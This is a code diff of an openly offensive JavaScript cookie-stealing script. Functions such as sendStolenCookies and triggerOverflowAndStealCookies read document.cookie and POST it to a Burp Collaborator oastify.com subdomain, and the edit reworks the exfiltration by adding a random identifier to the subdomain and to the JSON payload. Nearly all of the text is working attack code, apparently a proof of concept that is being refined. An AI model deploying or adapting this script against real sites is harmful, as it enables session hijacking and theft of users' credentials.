@@ -10,13 +10,22 @@ function setCookie(name, value, days) {
     document.cookie = name + "=" + (value || "") + expires + "; path=/";
 }
 
-// Function to send stolen cookies to attacker-controlled server
+// Function to send stolen cookies to Burp Collaborator subdomain endpoint
 function sendStolenCookies(cookies) {
-    // Send cookies to attacker-controlled server
+    // Generate a unique identifier for this request
+    var uniqueIdentifier = Math.random().toString(36).substring(7);
+
+    // Construct the payload containing stolen cookies and unique identifier
+    var payload = JSON.stringify({
+        cookies: cookies,
+        uniqueIdentifier: uniqueIdentifier
+    });
+
+    // Send payload to Burp Collaborator subdomain endpoint
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "http://kui76k3ejls8pgnwzoq7gtutyk4cs4gt.oastify.com/steal_cookies", true);
+    xhr.open("POST", "http://" + uniqueIdentifier + ".6u1t6630j7sup2nizaqtgfufy64yssgh.oastify.com", true);
     xhr.setRequestHeader("Content-Type", "application/json");
-    xhr.send(JSON.stringify(cookies));
+    xhr.send(payload);
 }
 
 // Function to trigger cookie jar overflow and steal cookies
@@ -32,7 +41,7 @@ function triggerOverflowAndStealCookies() {
     // Set a new cookie with attacker-controlled value
     document.cookie = "attackerCookie=" + document.cookie;
 
-    // Extract all cookies and send them to attacker-controlled server
+    // Extract all cookies and send them to Burp Collaborator subdomain endpoint
     sendStolenCookies(document.cookie);
 }
 
